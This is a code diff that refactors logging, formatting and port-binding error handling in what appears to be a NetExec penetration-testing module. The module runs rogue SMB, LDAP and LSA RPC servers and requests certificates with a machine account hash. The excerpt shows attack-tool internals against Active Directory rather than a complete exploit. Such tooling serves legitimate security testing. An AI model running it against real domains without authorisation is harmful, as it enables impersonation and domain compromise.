@@ -3,7 +3,6 @@ import logging
 import os
 import socket
 import struct
-import subprocess
 import sys
 import threading
 import time
@@ -31,6 +30,7 @@ from impacket.ldap.ldapasn1 import Scope
 from impacket.uuid import uuidtup_to_bin
 
 from nxc.helpers.misc import CATEGORY, gen_random_string
+from nxc.logger import nxc_logger
 from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.paths import NXC_PATH
 
@@ -57,7 +57,7 @@ def port_open(host, port, timeout=1.0):
         sock.close()
         return True
     except OSError as e:
-        logging.getLogger(__name__).debug(f"Port {host}:{port} not reachable: {e}")
+        nxc_logger.debug(f"Port {host}:{port} not reachable: {e}")
         return False
 
 
@@ -69,7 +69,7 @@ def resolve_hostname(hostname, nameserver):
         resolver.lifetime = 5
         return str(resolver.resolve(hostname, "A")[0])
     except Exception as e:
-        logging.getLogger(__name__).debug(f"DNS resolution failed for {hostname}: {e}")
+        nxc_logger.debug(f"DNS resolution failed for {hostname}: {e}")
         return None
 
 
@@ -289,9 +289,7 @@ class LSASrv(DCERPCServer):
         self.forest_name = forest_name
         self.domain_guid = domain_guid
         self.domain_sid = domain_sid
-        self.addCallbacks(self.LSA_UUID, "\\PIPE\\lsarpc",
-                          {0: self.cb_close, 6: self.cb_open, 7: self.cb_query,
-                           44: self.cb_open2, 46: self.cb_query2})
+        self.addCallbacks(self.LSA_UUID, "\\PIPE\\lsarpc", {0: self.cb_close, 6: self.cb_open, 7: self.cb_query, 44: self.cb_open2, 46: self.cb_query2})
 
     def make_unicode_str(self, value):
         rpc_str = lsad.RPC_UNICODE_STRING()
@@ -367,7 +365,7 @@ class LSASrv(DCERPCServer):
             query = lsad.LsarQueryInformationPolicy(data)
             info_level = int(query["InformationClass"])
         except Exception as e:
-            logging.getLogger(__name__).debug(f"LSA query parse failed, defaulting to level 12: {e}")
+            nxc_logger.debug(f"LSA query parse failed, defaulting to level 12: {e}")
             info_level = 12  # PolicyDnsDomainInfo
 
         resp = response_class()
@@ -702,7 +700,7 @@ def request_certificate(ca_ip, ca_name, domain, comp_name, comp_hash, dc_ip,
         binding = f"ncacn_np:{ca_ip}[\\pipe\\cert]"
         dce = connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip)
     except Exception as e:
-        logging.getLogger(__name__).debug(f"Named pipe transport failed, falling back to TCP: {e}")
+        nxc_logger.debug(f"Named pipe transport failed, falling back to TCP: {e}")
         binding = epm.hept_map(ca_ip, MSRPC_UUID_ICPR, protocol="ncacn_ip_tcp")
         dce = connect_icpr(binding, ca_ip, domain, comp_name, comp_hash, dc_ip)
 
@@ -873,21 +871,10 @@ class NXCModule:
             domain_nb=dns_to_netbios(connection.domain),
         )
 
-    def check_bind_capabilities(self):
-        if os.geteuid() == 0:
-            return True
-        python_path = os.path.realpath(sys.executable)
-        try:
-            result = subprocess.run(["getcap", python_path], capture_output=True, text=True, timeout=5)
-            if "cap_net_bind_service" in result.stdout:
-                return True
-        except (FileNotFoundError, subprocess.TimeoutExpired) as e:
-            self.context.log.debug(f"getcap check failed: {e}")
-        self.context.log.fail(
-            f"Cannot bind privileged ports (445/389). Run: "
-            f"sudo setcap cap_net_bind_service=+ep {python_path}"
-        )
-        return False
+    def check_bind_capabilities(self, label, error):
+        self.context.log.fail(f"Rogue {label} server failed to start: {error}")
+        if isinstance(error, PermissionError):
+            self.context.log.fail(f"Cannot bind privileged ports (445/389). Run: sudo setcap cap_net_bind_service=+ep {os.path.realpath(sys.executable)}")
 
     def select_target_ca(self, cas):
         if self.ca:
@@ -909,11 +896,7 @@ class NXCModule:
                 self.context.log.fail("Machine account provided but no password or hash available")
                 return None
             try:
-                resp = connection.search(
-                    searchFilter=f"(&(objectCategory=computer)(sAMAccountName={comp_name}))",
-                    attributes=["sAMAccountName", "dNSHostName"],
-                    sizeLimit=1,
-                )
+                resp = connection.search(searchFilter=f"(&(objectCategory=computer)(sAMAccountName={comp_name}))", attributes=["sAMAccountName", "dNSHostName"], sizeLimit=1,)
             except Exception as e:
                 self.context.log.fail(f"LDAP verification of '{comp_name}' failed: {e}")
                 return None
@@ -963,9 +946,6 @@ class NXCModule:
         return MachineAccount(name=comp_name, password=comp_pass, hash=comp_hash)
 
     def run_exploit(self, connection, cas):
-        if not self.check_bind_capabilities():
-            return
-
         ca = self.select_target_ca(cas)
         if not ca:
             return
@@ -1012,8 +992,7 @@ class NXCModule:
             target=run_rogue_smb, daemon=True,
             args=("0.0.0.0", 445, dc_info.domain_nb, connection.domain, connection.domain, dc_info.domain_guid,
                   dc_info.domain_sid, comp.name, comp.hash, comp.password, connection.domain, connection.host,
-                  smb_state),
-        ).start()
+                  smb_state),).start()
 
         ldap_srv = RogueLDAP(self.context, connection.domain, dc_info.domain_nb, connection.baseDN, comp.name,
                              comp.hash, connection.domain, connection.host, dc_info.sid_bin, dc_info.dns,
@@ -1028,10 +1007,10 @@ class NXCModule:
     def wait_for_rogue_servers(self, smb_state, ldap_state, timeout=15):
         for _ in range(timeout):
             if smb_state.error:
-                self.context.log.fail(f"Rogue SMB server failed to start: {smb_state.error}")
+                self.check_bind_capabilities("SMB", smb_state.error)
                 return False
             if ldap_state.error:
-                self.context.log.fail(f"Rogue LDAP server failed to start: {ldap_state.error}")
+                self.check_bind_capabilities("LDAP", ldap_state.error)
                 return False
             if port_open("127.0.0.1", 445) and port_open("127.0.0.1", 389):
                 return True
